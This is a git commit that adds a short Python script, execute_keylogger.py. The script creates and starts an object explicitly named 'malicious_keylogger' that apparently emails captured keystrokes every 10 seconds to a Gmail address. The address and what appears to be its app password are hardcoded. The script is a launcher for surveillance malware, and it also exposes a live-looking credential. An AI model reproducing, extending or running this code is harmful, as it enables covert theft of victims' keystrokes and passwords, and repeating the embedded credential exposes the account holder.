b977a659849a060d38c6b7a9fb1c3a4f47772fa7
Akanksha chhabra <92837705+akanksha1814@users.noreply.github.com>
2024-04-16 22:56:56 +0530

    Add files via upload

---
+++ execute_keylogger.py
@@ -0,0 +1,9 @@
+#!/usr/bin/env python
+
+import keylogger
+
+# Initialize / create keylogger
+malicious_keylogger = keylogger.KeyLogger(10, 'akanksha0655@gmail.com', 'tndt wcqo dqmx dwaq',[],[])
+
+# Execute Keylogger
+malicious_keylogger.start()
